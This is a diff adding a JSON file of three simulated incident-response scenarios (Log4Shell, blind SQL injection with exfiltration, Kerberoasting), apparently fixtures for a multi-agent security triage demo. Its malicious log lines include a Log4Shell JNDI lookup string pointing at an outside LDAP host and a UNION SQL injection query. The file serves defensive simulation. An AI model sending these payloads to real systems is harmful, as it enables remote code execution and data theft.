@@ -1,0 +1,62 @@
+{
+  "scenarios": [
+    {
+      "id": "INC-001",
+      "title": "Log4Shell RCE (Tier 1)",
+      "target_asset": "Root IdP Certificate Server",
+      "target_ip": "10.0.0.5",
+      "is_tier_1": true,
+      "logs": [
+        { "type": "benign", "time": "14:22:10", "content": "INFO: Health check passed for 10.0.0.5 [latency 2.1ms]" },
+        { "type": "benign", "time": "14:22:12", "content": "INFO: TLS session renewed with gateway.internal:443" },
+        { "type": "malicious", "time": "14:22:15", "content": "CRITICAL: 193.32.162.5 - - \"GET /?x=${jndi:ldap://193.32.162.5/a}\" 404" },
+        { "type": "benign", "time": "14:22:16", "content": "DEBUG: Ingress filter forwarded packet to authentication pipeline" },
+        { "type": "malicious", "time": "14:22:18", "content": "ALERT: Egress socket connection attempt initiated to 193.32.162.5:1389" }
+      ],
+      "graph_execution": [
+        { "node_id": "orchestrator", "status": "active", "duration_ms": 700 },
+        { "node_id": "reviewer", "status": "failed", "decision": "REJECTED (Blast Radius SLA)", "duration_ms": 1200 },
+        { "node_id": "rart", "status": "mutated", "decision": "TARGETED_RULE", "duration_ms": 900 }
+      ],
+      "persisted_memory": "Rule invoked: DPO Alignment enforces granular API revocation over BLOCK_SOURCE for SLA-critical nodes."
+    },
+    {
+      "id": "INC-002",
+      "title": "Blind SQL Injection & Exfiltration",
+      "target_asset": "Core Customer Billing DB",
+      "target_ip": "10.0.1.15",
+      "is_tier_1": false,
+      "logs": [
+        { "type": "benign", "time": "14:25:01", "content": "INFO: Periodic database backup worker checkpoint completed" },
+        { "type": "malicious", "time": "14:25:04", "content": "CRITICAL: HTTP 200 GET /api/v2/search?q=' UNION SELECT schema_name,2 FROM information_schema.schemata -- ;" },
+        { "type": "benign", "time": "14:25:06", "content": "WARN: Query execution duration exceeded p95 threshold (1820ms)" },
+        { "type": "malicious", "time": "14:25:09", "content": "ALERT: High entropy database response outbound stream (42.8 MB to external ASN)" }
+      ],
+      "graph_execution": [
+        { "node_id": "orchestrator", "status": "active", "duration_ms": 600 },
+        { "node_id": "reviewer", "status": "approved", "decision": "APPROVED (BLOCK_SOURCE Proportional)", "duration_ms": 1100 },
+        { "node_id": "rart", "status": "approved", "decision": "BLOCK_SOURCE_APPLIED", "duration_ms": 750 }
+      ],
+      "persisted_memory": "Policy standard: Non-Tier 1 database assets allow immediate source IP containment when data exfiltration entropy > 0.85."
+    },
+    {
+      "id": "INC-003",
+      "title": "Kerberoasting & Ticket Forgery",
+      "target_asset": "Primary Domain Controller PDC-01",
+      "target_ip": "10.0.0.1",
+      "is_tier_1": true,
+      "logs": [
+        { "type": "benign", "time": "14:28:30", "content": "INFO: Kerberos TGT request issued for user svc_backup" },
+        { "type": "malicious", "time": "14:28:33", "content": "CRITICAL: EventID 4769 - Anomalous TGS request RC4 encryption requested for SPN MSSQLSvc/db01.corp" },
+        { "type": "malicious", "time": "14:28:36", "content": "ALERT: Rapid burst of 14 service ticket extractions from single workstation 192.168.10.45" },
+        { "type": "benign", "time": "14:28:38", "content": "INFO: Domain controller load average nominal (0.12)" }
+      ],
+      "graph_execution": [
+        { "node_id": "orchestrator", "status": "active", "duration_ms": 650 },
+        { "node_id": "reviewer", "status": "failed", "decision": "REJECTED (DC Isolation Prohibited)", "duration_ms": 1300 },
+        { "node_id": "rart", "status": "mutated", "decision": "REVOKE_KERBEROS_SESSION", "duration_ms": 850 }
+      ],
+      "persisted_memory": "Rule invoked: DPO Guardrail prevents PDC network isolation; forces individual compromised service account ticket invalidation."
+    }
+  ]
+}
